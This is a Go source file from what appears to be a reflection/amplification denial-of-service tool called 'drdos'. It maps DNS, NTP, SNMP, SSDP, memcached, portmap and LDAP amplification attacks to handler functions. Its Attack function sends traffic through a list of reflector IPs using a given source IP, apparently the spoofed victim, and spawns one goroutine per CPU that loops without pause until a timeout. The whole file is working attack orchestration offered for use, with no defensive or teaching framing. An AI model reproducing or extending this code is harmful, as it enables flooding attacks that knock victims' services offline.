package core

import (
	"drdos/core/drdos"
	"drdos/utils"
	"errors"
	"runtime"
	"time"
)

var attacks map[string]interface{}

func init() {
	attacks = map[string]interface{}{
		"dns":     drdos.AttackDns,
		"ntp":     drdos.AttackNtp,
		"snmp":    drdos.AttackSnmp,
		"ssdp":    drdos.AttackSsdp,
		"mem":     drdos.AttackMemcache,
		"portmap": drdos.AttackPortmap,
		"ldap":    drdos.AttackLdap,
	}
}

func Attack(iplist []string, srcip string, atktype string, port int, interval uint, timeout uint) error {
	_, ok := attacks[atktype]
	if !ok {
		utils.ColorPrint("Atktype not supported", "warn")
		err := errors.New("Atktype not found")
		return err
	}

	task := func() {
		for {
			for _, ipaddr := range iplist {
				time.Sleep(time.Duration(interval) * time.Microsecond)
				utils.Call(attacks, atktype, ipaddr, srcip, port)
			}
		}
	}

	for i := 0; i < runtime.NumCPU(); i++ {
		go task()
	}
	time.Sleep(time.Duration(timeout) * time.Second)
	return nil
}
